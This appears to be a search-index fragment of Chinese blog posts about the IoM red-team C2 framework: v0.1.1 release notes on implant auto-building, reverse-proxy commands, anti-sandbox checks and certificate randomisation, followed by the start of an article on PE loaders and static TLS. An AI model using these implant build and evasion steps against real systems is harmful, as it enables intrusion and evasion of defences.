\u4f46\u53d7\u9650\u4e8e\u7cbe\u529b\uff0c\u8fd9\u4e9b\u5185\u5bb9\u90fd\u9700\u8981\u719f\u6089rust\u7684\u7f16\u8bd1\u624d\u80fd\u88ab\u5f88\u597d\u7684\u7ba1\u7406\u4e0e\u4f7f\u7528\u3002\u5e95\u5c42\u7684\u529f\u80fd\u5b9e\u9645\u4e0a\u5df2\u7ecf\u8fdc\u8fdc\u8d85\u8d8a\u4efb\u4f55\u4e00\u5bb6\u5f00\u6e90\u7684C2\uff0c \u666e\u901a\u4f7f\u7528\u8005\u5374\u65e0\u6cd5\u5f88\u597d\u7684\u611f\u77e5\u3002 \u56e0\u6b64v0.1.1\u4e3b\u8981\u4e3a\u4e86\u63d0\u5347\u7528\u6237\u4f53\u9a8c\u3001\u7b80\u5316\u590d\u6742\u64cd\u4f5c\uff0c \u5c06\u4e4b\u524d\u8f83\u4e3a\u590d\u6742\u7684TLS\u3001REM\u3001HotLoad\u7b49\u7b49\u529f\u80fd\u7b80\u5316\u5230\u6240\u6709\u7528\u6237\u90fd\u80fd\u8f7b\u6613\u4f7f\u7528\u7684\u7a0b\u5ea6\u3002</p> <p>\u672c\u6b21\u66f4\u65b0\u7684\u4e3b\u8981\u5185\u5bb9\u662f \u5f00\u7bb1\u5373\u7528\uff0c \u8ba9\u4e0d\u5177\u5907\u4e13\u4e1a\u77e5\u8bc6\u7684\u7528\u6237\u4e5f\u80fd\u8f7b\u677e\u4f7f\u7528</p> <p>\u4ecev0.1.1\u5f00\u59cb\uff0c IoM\u7684implant\u7f16\u8bd1\u90e8\u5206\u4e0d\u518d\u5177\u6709\u4efb\u4f55\u95e8\u69db\uff0c \u53ea\u9700\u8981\u5141\u8bb8\u5355\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5373\u53ef\u4f7f\u7528\uff0c \u4e0d\u518d\u9700\u8981\u4f9d\u8d56docker\u6216\u8005\u5b89\u88c5\u811a\u672c\u3002 client\u548cserver\u90fd\u53ea\u9700\u8981\u5355\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6**\u5f00\u7bb1\u5373\u7528**</p> <p>GUI \u5c06\u4f1a\u57281-2\u5468\u540e\u9002\u914dv0.1.1</p>"},{"location":"blog/2025/07/09/IoM_v0.1.1/#\u65b0\u7279\u6027","title":"\u65b0\u7279\u6027","text":""},{"location":"blog/2025/07/09/IoM_v0.1.1/#build-\u5f00\u7bb1\u5373\u7528","title":"build \u5f00\u7bb1\u5373\u7528","text":"<p>\u6211\u4eec\u4e5f\u8fdb\u884c\u4e86\u5927\u91cf\u7684\u6d4b\u8bd5\u548c\u5b9e\u6218\uff0c \u63a5\u6536\u5230\u4e86\u4e00\u5b9a\u7684\u53cd\u9988\u3002\u76ee\u524dIoM\u6700\u5927\u7684\u4e0a\u624b\u96be\u5ea6\u8fd8\u662frust\u7f16\u8bd1\u90e8\u5206\u3002\u5373\u4f7f\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u884c\u547d\u4ee4\u5373\u53ef\u8bd5\u7528\u7684docker\u81ea\u52a8\u5316\u7f16\u8bd1\u4ee5\u53cagithub action\u81ea\u52a8\u5316\u7f16\u8bd1\uff0c \u6bd4\u8d77Cobaltstrike\u8fd9\u6837\u7684\u901a\u8fc7patch\u751f\u6210beacon\u8fd8\u662f\u4e0d\u591f\u76f4\u63a5\u3002</p> <p>\u56e0\u6b64\u5c06\u7ed9**\u6240\u6709\u7528\u6237\u63d0\u4f9b\u6700\u57fa\u7840\u7248\u672c\u7684\u81ea\u52a8\u5316\u7f16\u8bd1**\uff0c \u8fd9\u4e2a\u7f16\u8bd1\u670d\u52a1\u6258\u7ba1\u5728\u670d\u52a1\u5668\u4e0a\uff0c \u5982\u679c\u6709\u5b89\u5168\u4e0a\u987e\u8651\uff0c \u53ef\u4ee5\u624b\u52a8\u5173\u95ed\u8fd9\u4e2a\u529f\u80fd\u3002 </p> <p>\u4f7f\u7528\u81ea\u52a8\u5316\u7f16\u8bd1\u670d\u52a1\u5373\u89c6\u4e3a\u540c\u610f\u7528\u6237\u534f\u8bae</p> <p>\u5728\u63d0\u4f9b\u81ea\u52a8\u5316\u7f16\u8bd1\u7684\u540c\u65f6, \u4e5f\u6dfb\u52a0\u4e86malefic.yar</p> <p>\u4efb\u4f55\u9632\u62a4\u8bbe\u5907\u7684\u5382\u5bb6\u53ef\u4ee5\u901a\u8fc7\u6211\u4eec\u7684malefic.yar \u68c0\u6d4b\u901a\u8fc7\u81ea\u52a8\u5316\u670d\u52a1\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6</p> <pre><code>saas:  \n  enable: true  \n  url: http://build.chainreactors.red  \n  token: **** # community\u7528\u6237\u4f1a\u81ea\u52a8\u6ce8\u518c\u751f\u6210license\n</code></pre> <p>\u5982\u679ctoken\u4e3anull\uff0c \u5219\u4f1a\u81ea\u52a8\u6ce8\u518c\uff0c \u5411\u670d\u52a1\u5668\u83b7\u5f97\u4e00\u4e2atoken\uff0c \u5bf9\u4e8e\u7528\u6237\u6765\u8bf4\u662f\u65e0\u611f\u7684\u3002 </p> <p>listener\u65b0\u589e\u4e86autobuild\u914d\u7f6e\u5757,  \u5c06\u4f1a\u4f7f\u7528\u81ea\u52a8\u5316\u7f16\u8bd1\u670d\u52a1\u751f\u6210\u6700\u57fa\u672c\u7684implant \u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u4ee5\u8fbe\u5230\u63a5\u8fd1CobaltStrike\u7684\u7528\u6237\u4f53\u9a8c</p> <pre><code>listeners:  \n  enable: true  \n  auto_build:  \n    enable: true  \n    build_pulse: true  \n    target:  \n      - x86_64-pc-windows-gnu  \n    pipeline:  \n      - tcp  \n      - http\n  ......\n</code></pre> <p>\u6211\u4eec\u6781\u5927\u7684\u7b80\u5316\u4e86\u539f\u672c<code>\u5b89\u88c5docker/github action -&gt; new profile -&gt; build</code> \u7684\u6d41\u7a0b\uff0c \u73b0\u5728\u53ea\u9700\u8981\u8fd0\u884cserver\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c \u5373\u53ef\u76f4\u63a5\u4f7f\u7528</p>"},{"location":"blog/2025/07/09/IoM_v0.1.1/#mal-\u5f00\u7bb1\u5373\u7528","title":"mal \u5f00\u7bb1\u5373\u7528","text":"<p>\u6211\u4eec\u53d1\u73b0\u4e86mal-community\u56e0\u4e3a\u5b9e\u73b0\u7684\u8fc7\u4e8e\u5306\u5fd9\uff0c \u5bfc\u81f4bug\u8f83\u591a\uff0c\u7528\u6237\u4f53\u9a8c\u6781\u5dee\uff0c\u5b9e\u9645\u4f7f\u7528\u8005\u4e5f\u5be5\u5be5\u65e0\u51e0\u3002 \u5e76\u4e14\u9700\u8981\u901a\u8fc7mal install\u8fdb\u884c\u624b\u52a8\u5b89\u88c5\u3002 \u800cv0.1.1 \u4e2d\uff0c \u6211\u4eec\u5c06\u6700\u5e38\u7528\u7684\u63d2\u4ef6\u5d4c\u5165\u5230client\u4e2d\uff0c\u5b9e\u73b0**\u5f00\u7bb1\u5373\u7528**\u3002</p> <p>\u6211\u4eec\u5728client\u4e2d\u7ef4\u62a4\u4e00\u4e2a\u5185\u7f6e\u7684mal \u63d2\u4ef6\u5de5\u5177\u96c6\uff0c \u8fd9\u4e2a\u5de5\u5177\u96c6\u5c06\u88ab\u826f\u597d\u7684\u7ef4\u62a4\u4ee5\u53ca\u6301\u4e45\u66f4\u65b0\uff0c \u4f46\u53ea\u4f1a\u6dfb\u52a0\u5fc5\u8981\u7684\u529f\u80fd\uff0c\u5df2\u9632\u6b62client\u4e8c\u8fdb\u5236\u6587\u4ef6\u4f53\u79ef\u8fc7\u5ea6\u81a8\u80c0\u3002 </p> <p></p>"},{"location":"blog/2025/07/09/IoM_v0.1.1/#rem-\u5f00\u7bb1\u5373\u7528","title":"rem \u5f00\u7bb1\u5373\u7528","text":"<p>\u539f\u672c\u7684rem\u76f8\u5173\u529f\u80fd\u6709\u5f88\u5927\u4e00\u90e8\u5206\u4f4d\u4e8e mal-community\u7684community-proxy\u4e0b, \u9020\u6210\u4e86\u6781\u5f3a\u7684\u5272\u88c2\u611f\u3002 \u800c\u73b0\u5728\u6211\u4eec\u5c06rem\u4e5f\u79fb\u52a8\u5230\u4e86embed mal\u4e2d\u3002</p> <p>\u539f\u672c\u7684rem\u9700\u8981\u901a\u8fc7\u7f16\u8bd1\u3001\u63d2\u4ef6\u7b49\u7b49\u65b9\u5f0f\u8fdb\u884c\u52a0\u8f7d\u3002 \u800c\u73b0\u5728\u5b8c\u5168\u5185\u7f6e\uff0c \u5e76\u63d0\u4f9b\u4e86\u9884\u7f16\u8bd1\u7684\u7248\u672c\u3002</p> <p>\u7528\u6cd51 \u52a8\u6001\u52a0\u8f7drem module</p> <pre><code># \u52a0\u8f7drem dll\nrem_community load \n\n# \u9009\u62e9\u5bf9\u5e94\u7684rem pipeline, \u642d\u5efa\u4e86\u53cd\u5411\u4ee3\u7406\u96a7\u9053\nrem_community socks5 rem_pipeline\n</code></pre> <p>\u7528\u6cd52 \u901a\u8fc7\u9759\u6001\u94fe\u63a5.a \u7f16\u8bd1implant</p> <pre><code>build beacon --profile tcp_deafult --target x86_64-pc-windows-gnu --rem\n</code></pre>"},{"location":"blog/2025/07/09/IoM_v0.1.1/#profilebuildartifact-\u547d\u4ee4\u7ec4\u91cd\u6784","title":"profile/build/artifact \u547d\u4ee4\u7ec4\u91cd\u6784","text":"<ul> <li>artifact download \u652f\u6301--format, \u652f\u6301\u5341\u6570\u79cd\u4e0d\u540c\u7684\u683c\u5f0f</li> <li>artifact\u81ea\u52a8\u6302\u8f7d\u5230website, \u901a\u8fc7\u81ea\u5b9a\u4e49\u5bc6\u94a5\u6620\u5c04\u76ee\u5f55</li> <li>\u65b0\u589eartifact show \u547d\u4ee4\uff0c \u5c55\u793aartifact \u57fa\u672c\u4fe1\u606f</li> <li>\u7b80\u5316client build \u547d\u4ee4\u7ec4</li> <li>build module \u65b0\u589e--3<sup>rd</sup>\uff0c \u5141\u8bb8\u7f16\u8bd13rd modules</li> <li>build beacon \u65b0\u589e --rem\uff0c \u9759\u6001\u94fe\u63a5rem</li> <li>build beacon \u5b9e\u88c5 --proxy\u547d\u4ee4</li> <li>build beacon \u65b0\u589e --tls \u547d\u4ee4\uff0c \u5f00\u542ftls</li> <li>......</li> </ul> <p>profile/build/artifact \u7ecf\u8fc7\u591a\u6b21\u4f18\u5316\u7528\u6237\u4f53\u9a8c\uff0c\u5e76\u7ed3\u5408\u81ea\u52a8\u5316\u7f16\u8bd1\uff0c \u73b0\u5728\u5df2\u7ecf\u80fd\u8ba9\u5b8c\u5168\u4e0d\u61c2\u7684\u7528\u6237\u4e5f\u80fd\u505a\u5230\u5f00\u7bb1\u5373\u7528\u3002 </p>"},{"location":"blog/2025/07/09/IoM_v0.1.1/#\u8bc1\u4e66\u7ba1\u7406","title":"\u8bc1\u4e66\u7ba1\u7406","text":"<p>\u76ee\u524dIoM\u7684tls\u76f8\u5173\u529f\u80fd\u88ab\u4f7f\u7528\u8f83\u5c11\uff0c \u4e3b\u8981\u539f\u56e0\u662ftls\u4f7f\u7528\u8f83\u4e3a\u590d\u6742\uff0c \u9700\u8981\u624b\u52a8\u7533\u8bf7\u8bc1\u4e66\uff0c\u901a\u8fc7\u591a\u4e2aflag\u8fdb\u884c\u914d\u7f6e\u3002 \u4e3a\u6b64\uff0c \u6211\u4eec\u4f18\u5316\u4e86\u8fd9\u4e2a\u6d41\u7a0b\uff0c \u5927\u5927\u7b80\u5316\u4e86\u8bc1\u4e66\u81ea\u52a8\u7533\u8bf7\uff0c \u8bc1\u4e66\u914d\u7f6e\uff0c\u81ea\u7b7e\u540d\u8bc1\u4e66\u76f8\u5173\u64cd\u4f5c\u3002</p> <p>\u5982\u679c\u4e0d\u6307\u5b9a\u7279\u5b9a\u7684\u5b57\u6bb5\uff0c \u81ea\u7b7e\u540d\u8bc1\u4e66\u5c06\u901a\u8fc7\u968f\u673a\u503c\u586b\u5145\uff0c \u5c3d\u53ef\u80fd\u51cf\u5c11\u7279\u6b8a\u76f8\u5173\u7279\u5f81\u3002 </p> <p></p>"},{"location":"blog/2025/07/09/IoM_v0.1.1/#\u91cd\u6784transportpipeline","title":"\u91cd\u6784transport/pipeline","text":"<p>implant\u4e0a\u7684transport\u8fdb\u884c\u4e86\u5b8c\u5168\u7684\u91cd\u6784\uff0c \u4ece\u63a5\u53e3\u5230\u5b9e\u73b0\u90fd\u4e0e\u4e4b\u524d\u5b8c\u5168\u4e0d\u540c</p> <ul> <li>\u652f\u6301socks5/http\u4ee3\u7406</li> <li>\u4fee\u590d\u4e0e\u91cd\u6784tls\u652f\u6301\uff0c \u53ef\u4ee5\u914d\u7f6etls1.2\uff0ctls1.3</li> <li>\u4f18\u5316transport\u6027\u80fd</li> <li>\u4f18\u5316rem\u7684\u652f\u6301</li> <li>\u901a\u8fc7\u6cdb\u578b\u5b9e\u73b0\uff0c \u80fd\u63a5\u6536\u6240\u6709\u57fa\u4e8e <code>pub trait TransportImpl: AsyncRead + AsyncWrite + Unpin + Send  {}</code> \u7684\u5b9e\u73b0</li> <li>\u4fee\u590d\u4e86\u4e00\u7cfb\u5217\u8fb9\u754c\u6761\u4ef6\u4e0bimplant\u5047\u6b7b\u7684bug</li> <li>\u4fee\u590d\u9ed8\u8ba4tokio\u6700\u5927\u7ebf\u7a0b\u6570\u4e3a2\u7684bug\uff0c \u5bfc\u81f4\u591a\u4e2a\u4efb\u52a1\u65f6\u4f1a\u963b\u585e</li> <li>\u65b0\u589eswtich internal module, \u5141\u8bb8\u52a8\u6001\u5207\u6362pipeline</li> <li>..... </li> </ul> <p>\u6211\u4eec\u8c03\u6574\u4e86transport\u7684\u4ee3\u7801\u7ed3\u6784\u3001\u5177\u4f53\u5b9e\u73b0\u3001\u6027\u80fd\u4ee5\u53ca\u5927\u91cfbug\u4fee\u590d\u3002 </p> <p>\u73b0\u5728\u7684implant\u7684transport\u53ef\u4ee5\u9002\u914d\u591a\u5f02\u6b65\u8fd0\u884c\u65f6\uff0csmol/async-std/tokio\u3002 \u5e76\u4e14\u5b8c\u5168\u57fa\u4e8efutures\u5e93\u7684trait\u5b9e\u73b0\uff0c \u540e\u7eed\u5c06\u80fd\u66f4\u81ea\u7531\u7684\u63a5\u5165\u5404\u79cd\u4fe1\u9053\u3002 </p> <p>\u540c\u6837\u7684\uff0c \u5728server/listener \u4e0a\uff0c \u6211\u4eec\u4e5f\u5b8c\u5168\u91cd\u6784\u4e86pipeline\u3002  \u6700\u5927\u7684\u6539\u52a8\u6765\u81ea\u4e8epipeline\u7684 encryption/cryptor/tls\u53ef\u4ee5\u590d\u7528\u5728\u4e00\u4e2a\u7aef\u53e3\u4e0a\u3002 </p> <p>\u5728\u6b64\u4e4b\u524d\uff0c\u4e00\u4e2a\u7aef\u53e3\u53ea\u652f\u6301\u4e00\u79cd\u52a0\u5bc6\u65b9\u5f0f\uff0c\u4e00\u79cd\u534f\u8bae\uff0ctls\u5f00/\u5173\u3002 \u800c\u65b0\u589e\uff0c \u53ef\u4ee5\u540c\u65f6\u914d\u7f6e\u591a\u79cd\u534f\u8bae\uff0c \u591a\u79cd\u52a0\u5bc6\u65b9\u5f0f\uff0cTLS\u81ea\u52a8\u8bc6\u522b\u3002 </p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c \u4e4b\u524d\u9700\u89816\u4e2a\u7aef\u53e3\u5b9e\u73b0\u7684\u5de5\u4f5c\uff0c \u73b0\u5728\u901a\u8fc7\u591a\u8def\u590d\u7528\u5728\u4e00\u4e2a\u7aef\u53e3\u4e2d\u5b9e\u73b0\u3002</p> <p>\u914d\u7f6e\u5bf9\u6bd4\uff0c \u5de6\u8fb9\u662f\u65b0\u7248\u7684\uff0c \u914d\u7f6e\u53c2\u6570\u5df2\u7ecf\u6781\u5927\u7b80\u5316</p> <p></p> <p>\u5e76\u4e14artifact\u4e0ewebsite\u6709\u4e86\u7c7b\u4f3cCobaltStrike\u7684web delivery \u7684\u8054\u52a8</p> <p></p>"},{"location":"blog/2025/07/09/IoM_v0.1.1/#implant-anti-sandbox","title":"implant anti sandbox","text":"<p>\u6211\u4eec\u5b9e\u73b0\u4e00\u7ec4\u7b80\u5355\u7684\u53cd\u6c99\u7bb1\u7684\u68c0\u6d4b\u673a\u5236\uff0c\u6280\u672f\u6765\u81ea https://github.com/ayoubfaouzi/al-khaser \u3002 \u6211\u4eec\u4f7f\u7528rust\u8fdb\u884c\u4e86\u7b80\u5355\u7684\u4fee\u6539\u4e0e\u5b9e\u73b0\u3002 \u8fd9\u4e2a\u68c0\u6d4b\u673a\u5236\u975e\u5e38\u7b80\u5355\uff0c \u5b9e\u9645\u4e0a\u4e5f\u4e0d\u5177\u5907\u5bf9\u6297\u6548\u679c\u3002 \u76ee\u7684\u662f\u63d0\u4f9b\u53cd\u6c99\u7bb1\u7684\u76f8\u5173\u63a5\u53e3\uff0c \u4ee5\u4f9b\u540e\u7eed\u5b9a\u5236\u5316\u5f00\u53d1</p> <p></p>"},{"location":"blog/2025/07/09/IoM_v0.1.1/#\u5176\u4ed6\u66f4\u65b0","title":"\u5176\u4ed6\u66f4\u65b0","text":"<ul> <li>exec module\u652f\u6301\u5b9e\u65f6\u56de\u663e</li> <li>\u4fee\u590ddarwin \u7f16\u8bd1\u62a5\u9519</li> <li>\u7279\u5b9a\u64cd\u4f5c\u7cfb\u7edf\u4e0b\uff0c\u968f\u5373\u6570\u751f\u6210\u5668\u5931\u6548\u7684bug</li> <li>fix XOR cryptor not work</li> <li>\u5b9e\u73b0runas\u3001rev2self\u3001privs\u6a21\u5757</li> <li>BOF\u591a\u4e2abuf\u4fee\u590d\uff0c \u9002\u914dwindows server2012</li> <li>\u5927\u91cf\u7684\u7528\u6237\u4f53\u9a8c\u8c03\u6574\u4e0e\u7ec6\u8282bug\u4fee\u590d\u4e0d\u4e00\u4e00\u5217\u4e3e</li> <li>...</li> </ul>"},{"location":"blog/2025/07/09/IoM_v0.1.1/#end","title":"End","text":"<p>\u4ecev0.1.1 \u5f00\u59cb\uff0c \u6211\u4eec\u53ef\u4ee5\u4e22\u6389\u5b89\u88c5\u811a\u672c\uff0c \u4e22\u6389\u7f16\u8bd1\u73af\u5883\uff0c \u53ea\u9700\u8981server\u548cclient\u4e24\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c \u5373\u53ef\u5728\u4efb\u610f\u4f4d\u7f6e\u4f7f\u7528IoM\uff0c\u4e0d\u518d\u6709\u590d\u6742\u7684\u73af\u5883\u5b89\u88c5\uff0crust\u7f16\u8bd1\u64cd\u4f5c\u3002 \u5bf9\u7edd\u5927\u591a\u6570\u8f7b\u5ea6\u7528\u6237\u4e0d\u4f1a\u5e26\u6765\u4efb\u4f55\u7684\u8d1f\u62c5\uff0c \u80fd\u505a\u5230\u63a5\u8fd1CobaltStrike/vshell\u7ea7\u522b\u7684\u5f00\u7bb1\u5373\u7528\u3002 </p>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/","title":"IoM\u8fdb\u9636\u7cfb\u5217(1) PELoader&RDI\u7684TLS\u4e4b\u6b87","text":""},{"location":"blog/2025/01/07/IoM_advanced_TLS/#\u4ece\u4e00\u4e2a\u5d29\u6e83\u5f00\u59cb\u7684-pe-loader-\u6551\u8d4e\u4e4b\u65c5","title":"\u4ece\u4e00\u4e2a\u5d29\u6e83\u5f00\u59cb\u7684 PE Loader \u6551\u8d4e\u4e4b\u65c5","text":"<p>\u672c\u7cfb\u5217\u6587\u7ae0\u867d\u7136\u53eb\u505aIoM\u8fdb\u9636\u7cfb\u5217\uff0c \u4f46\u5b9e\u9645\u4e0eIoM\u5173\u7cfb\u4e0d\u5927\uff0c\u53ea\u662f\u5728\u5f00\u53d1IoM\u7684\u8fc7\u7a0b\u4e2d\u9047\u5230\u7684\u3002\u8fdb\u9636\u7cfb\u5217\u5747\u4e3a\u89e3\u51b3\u524d\u65e0\u53e4\u4eba\u7684\u95ee\u9898\u3001\u521b\u65b0\u7b49\uff0c \u672c\u6587\u5c06\u4ece\u6700\u5e38\u7528\u7684\u6280\u672f PE-Loader\u5f00\u59cb\u3002 </p> <p>\u5982\u679c\u8bfb\u8005\u5df2\u7ecf\u719f\u77e5PE\u52a0\u8f7d\uff0c \u90a3\u4e48\u672c\u6587\u7684\u5185\u5bb9\u5c06\u4e0d\u4f1a\u6709\u975e\u5e38\u5927\u7684\u9769\u65b0\uff0c \u4f46\u5404\u4f4d\u9605\u8bfb\u5b8c\u672c\u6587\u53ef\u80fd\u4e5f\u4f1a\u770b\u5230\u4e00\u4e9b\u65b0\u9c9c\u73a9\u610f\uff0c \u804a\u4ee5\u6170\u7c4d :)</p> <p>\u4eca\u5e748\u6708\uff0c \u6211\u4eec\u63a8\u51fa\u4e86\u4e0b\u4e00\u4ee3 <code>C2</code> \u8ba1\u5212 -- <code>Internal of Malice</code> , \u65e8\u5728\u5b9e\u73b0\u4e00\u5957 <code>post-exploit</code> \u57fa\u7840\u8bbe\u65bd\uff0c \u5728<code>implant</code>\u7684\u8bed\u8a00\u9009\u7528\u4e2d\uff0c \u6211\u4eec\u5c1d\u8bd5\u4e86\u8fd9\u4e24\u5e74\u6700\u706b\u70ed\u7684\u7ea2\u961f\u8bed\u8a00\uff1a<code>Rust</code>, \u4e5f\u56e0\u4e3a\u8fd9\u4e2a\u9009\u62e9\uff0c\u5728\u5b9e\u73b0\u8fc7\u7a0b\u4e2d\u9047\u5230\u4e86\u548c\u89e3\u51b3\u4e86\u975e\u5e38\u591a\u6709\u610f\u601d\u7684\u95ee\u9898\u3002</p> <p>\u5728\u63a8\u51fa<code>stager</code> \u7248\u672c\u4e4b\u540e\uff0c \u4ea4\u6d41\u7fa4\u7684\u4e00\u4f4d\u540c\u5b66\u8d34\u51fa\u4e86Writing a PE Loader for the Xbox in 2024 \u8fd9\u7bc7\u6587\u7ae0\uff0c \u7528\u4e00\u79cd\u975e\u5e38\u7c97\u66b4\u7684\u65b9\u5f0f\u89e3\u51b3\u4e86 <code>Rust</code>\u5728\u4f7f\u7528<code>MSVC</code>\u7f16\u8bd1\u65f6\u5f15\u5165\u4e86<code>TLS(thread-local storage)</code>  , \u800c\u53ea\u5e38\u89c1\u7684<code>PELoader</code> \u7b80\u5355\u8c03\u7528 <code>tls callback</code> \u65e0\u6cd5\u6b63\u5e38\u52a0\u8f7d <code>PE</code> \u6587\u4ef6\u7684\u95ee\u9898\uff0c \u9042\u6210\u6587\u3002</p>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/#tlnr","title":"TL;NR","text":"<p>\u5728\u672c\u6587\u4e4b\u524d\uff0c\u51e0\u4e4e\u6240\u6709\u7684SRDI\u6216\u8005\u7c7b\u4f3c\u7684PE Loader\u90fd\u4f1a\u9762\u4e34PE\u4f7f\u7528\u9759\u6001TLS\u800c\u5bfc\u81f4\u7684\u52a0\u8f7d\u95ee\u9898</p> <p>\u8fd9\u4e2a\u95ee\u9898\u7684\u8868\u73b0\u5728rust\u7f16\u8bd1\u7684\u7a0b\u5e8f\u65e0\u6cd5\u88ab\u4efb\u610f PE loader \u52a0\u8f7d\u3002 \u5f53\u7136\u4e0d\u4ec5\u9650\u4e8erust\uff0c \u6709\u975e\u5e38\u591a\u7684\u8bed\u8a00\u90fd\u4f1a\u4f7f\u7528TLS\u6027\u80fd\u52a0\u901f\u3002 \u5982\u679c\u4f60\u9047\u5230\u8fc7\u67d0\u4f7f\u7528donut/SRDI\u751f\u6210\u7684shellcode\u83ab\u540d\u5176\u5999\u5d29\u6e83\uff0c \u5f88\u6709\u53ef\u80fd\u5c31\u662f\u8fd9\u4e2a\u95ee\u9898\u3002 </p> <p>\u53ef\u80fd\u56e0\u4e3a\u4ed6\u4eec\u4e0d\u662f\u57fa\u4e8erust\u751f\u6001\u6784\u5efa\uff0c\u6240\u4ee5\u53ef\u4ee5\u6682\u65f6\u9003\u907f\u8fd9\u4e2a\u95ee\u9898\uff0c \u4e5f\u610f\u5473\u7740\u653e\u5f03\u6240\u6709\u4f7f\u7528rust\u7f16\u5199\u7684\u5de5\u5177\u3002\u4f46IoM\u5b8c\u5168\u57fa\u4e8erust \u6784\u5efa\u81ea\u5df1\u7684\u57fa\u7840\u8bbe\u65bd\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u5f97\u4e0d\u9762\u5bf9\u8fd9\u4e2a\u95ee\u9898\u3002</p> <ul> <li>No-Consolation: \u4e0d\u652f\u6301\u9759\u6001TLS</li> </ul> <p> - donut, \u4e0d\u652f\u6301\u9759\u6001TLS\uff0c \u4e5f\u610f\u5473\u7740\u6240\u6709\u57fa\u4e8edonut\u6784\u5efa\u7684C2\u4e5f\u90fd\u4e0d\u652f\u6301\uff0c \u5305\u62ecsliver, xiebroC2, merlin\u7b49\u7b49\u3002 (\u987a\u5e26\u4e00\u63d0, \u76ee\u524d\u5927\u90e8\u5206C2\u7684pe loader\u90fd\u57fa\u4e8edonut\u6784\u5efa\uff0c donut\u662f\u4e2a\u975e\u5e38\u5f3a\u5927\u7684\u9879\u76ee) - sRDI \u4e0d\u652f\u6301\u9759\u6001TLS - link, link \u5b9e\u73b0\u4e86\u81ea\u5df1\u7684sRDI, \u4f46\u662f\u4ed6\u4e5f\u4e0d\u652f\u6301T\u9759\u6001TLS, \u4e0d\u80fd\u52a0\u8f7d\u81ea\u8eab\u3002  - c3 \u89e3\u51b3\u4e86win7, win10\u90e8\u5206\u7248\u672c\u7684\u9759\u6001TLS\u95ee\u9898 - ... </p> <p>\u51e0\u4e4e\u6240\u6709\u7684PE Loader\u90fd\u653e\u5f03\u4e86\u5bf9rust\u7a0b\u5e8f\u4ee5\u53ca\u7528\u5230\u4e86\u9759\u6001TLS\u7a0b\u5e8f\u7684\u7684\u517c\u5bb9\u3002</p> <p>\u5728\u672c\u6587\u53d1\u5e03\u65f6\uff0cIoM v0.0.4\u4e5f\u5df2\u7ecf\u53d1\u5e03, \u672c\u6587\u7684\u76f8\u5173\u6210\u679c\u5c06\u968f\u7740malefic-mutant\u4e00\u540c\u53d1\u5e03\u3002 </p> <p>\u53ef\u4ee5\u4f7f\u7528malefic-mutant \u5c06\u5e26\u6709TLS\u7684PE\u6587\u4ef6\u8f6c\u4e3ashellcode\uff0c \u8be5shellcode\u80fd\u88ab\u4efb\u610fshellcode loader\u52a0\u8f7d\u3002 </p> <p><pre><code>malefic-mutant build srdi -i malefic.exe\n</code></pre> </p>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/#\u4ece-implant-\u7684\u8bbe\u8ba1\u7406\u5ff5\u8bf4\u8d77","title":"\u4ece Implant \u7684\u8bbe\u8ba1\u7406\u5ff5\u8bf4\u8d77","text":"<p>\u5728\u8bbe\u8ba1\u4e4b\u521d\uff0c <code>implant</code> \u5c31\u662f\u4e00\u4e2a\u7531\u5404\u79cd\u53ef\u66ff\u6362\u7ec4\u4ef6\u6784\u6210\u7684 <code>\u661f\u8230</code>\uff0c \u4e00\u4e2a\u6db5\u76d6\u4e86\u591a\u79cd\u65e0\u6587\u4ef6\u653b\u51fb\u6a21\u5757(\u4ee5<code>Windows</code>\u5e73\u53f0\u4e3e\u4f8b\u7684<code>Shellcode</code>, <code>PE</code>, <code>.Net</code>, <code>Powershell</code>, <code>BOF</code>) \u7684\u53ef\u7ec4\u88c5\u8f7d\u4f53\uff0c \u5b83\u5e94\u8be5\u662f\u4e00\u4e2a\u53ef\u4ee5\u627f\u8f7d\u5404\u79cd\u683c\u5f0f\u7684 <code>payload</code> \u53d1\u5c04\u5668\uff0c\u6216\u8005\u4f5c\u4e3a\u4e00\u4e2a\u5b89\u9759\u7684\u6d41\u91cf\u4ee3\u7406\u5de5\u5177\uff0c \u56e0\u6b64\u5bf9\u4e8e <code>implant</code> \u800c\u8a00\uff0c \u5404\u79cd\u52a8\u6001\u52a0\u8f7d\u7684\u529f\u80fd\u5fc5\u4e0d\u53ef\u5c11\uff0c \u800c\u5728 <code>windows</code> \u4e2d\uff0c <code>LoadPE</code> \u5c31\u662f\u5b9e\u73b0\u8fd9\u4e2a\u60f3\u6cd5\u7684\u4e00\u4e2a\u6700\u57fa\u672c\u7684\u529f\u80fd</p> <p>\u5728\u5f00\u59cb\u4e4b\u524d\uff0c \u6211\u4eec\u8fd8\u662f\u5148\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b<code>LoadPE</code>, \u5728\u4e00\u4e2a <code>LoadPE</code> \u7684\u5e38\u89c4\u6d41\u7a0b\u4e2d\uff0c \u6709\u7740\u5982\u4e0b\u51e0\u4e2a\u5e38\u89c4\u52a8\u4f5c</p> <ul> <li>\u89e3\u6790 <code>PE</code> \u5934</li> <li>\u6620\u5c04\u8282\u533a</li> <li>\u4fee\u590d\u91cd\u5b9a\u4f4d\u8868</li> <li>\u4fee\u590d\u5bfc\u5165\u8868</li> <li>\u4fee\u590d\u5ef6\u8fdf\u5bfc\u5165\u8868</li> <li>\u4fee\u590d\u6743\u9650</li> <li>\u8c03\u7528 <code>TLS callback</code> \u51fd\u6570</li> <li>\u6dfb\u52a0\u5f02\u5e38\u5904\u7406\u51fd\u6570</li> <li>\u8c03\u7528\u5165\u53e3\u70b9\uff08\u53ef\u9009\uff09</li> </ul> <p>\u5728\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c \u8fd9\u6837\u7684\u4e00\u5957\u6d41\u7a0b\u4e0b\u6765\u53ef\u4ee5\u6db5\u76d6\u57fa\u672c\u7684 <code>PE</code> \u6587\u4ef6\u52a0\u8f7d\u4e86\uff0c 